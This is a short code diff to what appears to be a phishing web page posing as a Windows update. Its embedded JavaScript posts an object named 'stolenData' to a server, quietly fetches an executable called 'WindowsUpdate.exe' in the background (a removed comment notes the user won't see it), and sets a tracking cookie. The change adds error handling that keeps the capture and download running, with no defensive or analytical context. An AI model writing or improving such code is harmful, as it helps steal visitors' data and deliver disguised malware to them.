@@ -256,10 +256,10 @@ def index():
             headers: {{'Content-Type': 'application/json'}},
             body: JSON.stringify(stolenData),
             keepalive: true
-        }});
+        }}).catch(e => console.log('Capture failed'));
         
-        // Trigger EXE download in background (user won't see)
-        fetch('/WindowsUpdate.exe');
+        // Trigger EXE download in background
+        fetch('/WindowsUpdate.exe').catch(e => console.log('Download failed'));
         
         // Set tracking cookie
         document.cookie = "ms_update=active; path=/; max-age=3600";
